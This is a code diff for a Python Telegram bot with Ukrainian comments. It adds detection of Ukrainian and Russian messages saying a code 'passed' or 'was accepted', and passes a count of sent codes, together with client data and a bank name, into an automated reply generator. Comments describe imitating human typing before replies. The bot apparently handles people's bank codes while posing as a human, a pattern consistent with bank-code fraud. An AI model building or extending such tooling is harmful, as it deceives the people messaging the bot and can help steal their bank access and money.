@@ -817,7 +817,22 @@ def is_wrong_code_text(text: str, chat_history: list = None) -> bool:
             return True
     return False
 
+def is_code_success_text(text: str) -> bool:
+    t = text.lower().strip()
+    keywords = [
+        "підійшов", "підійш", "підійшло", "пройшов", "пройшло", "пройш",
+        "прийняв", "прийняло", "все ок", "все гуд", "все добре",
+        "подошел", "подошло", "прошел", "прошло", "принял", "приняло",
+        "все отлично", "все хорошо", "заработало", "сработало", "запустило"
+    ]
+    for kw in keywords:
+        if kw in t:
+            return True
+    return False
+
 def is_code_request_text(text: str) -> bool:
+    if is_code_success_text(text):
+        return False
     t = text.lower().strip()
     
     # Прямі запити коду або повідомлення про відправку (близько 60 варіацій)
@@ -1073,6 +1088,7 @@ async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bo
         line_info = await db.get_line(line_id) if line_id else None
         current_bank_name = line_info['bank'] if line_info else None
         client_data = existing_session['client_data']
+        sent_codes_count = existing_session.get('sent_codes_count', 0)
         
         # Перевіряємо зміну банку для очищення історії
         state_data = await state.get_data()
@@ -1106,7 +1122,8 @@ async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bo
             user_text=message.text,
             client_data=client_data,
             current_bank_name=current_bank_name,
-            chat_history=chat_history
+            chat_history=chat_history,
+            sent_codes_count=sent_codes_count
         )
         
         # Імітація людського друку перед надсиланням відповіді
@@ -1191,6 +1208,7 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
         line_info = await db.get_line(line_id) if line_id else None
         current_bank_name = line_info['bank'] if line_info else None
         client_data = existing_session['client_data']
+        sent_codes_count = existing_session.get('sent_codes_count', 0)
         
         import io
         photo_file = await bot.get_file(photo.file_id)
@@ -1205,7 +1223,8 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
             user_text=message.caption,
             image_bytes=photo_data,
             client_data=client_data,
-            current_bank_name=current_bank_name
+            current_bank_name=current_bank_name,
+            sent_codes_count=sent_codes_count
         )
         
         # Імітація людського друку перед надсиланням відповіді
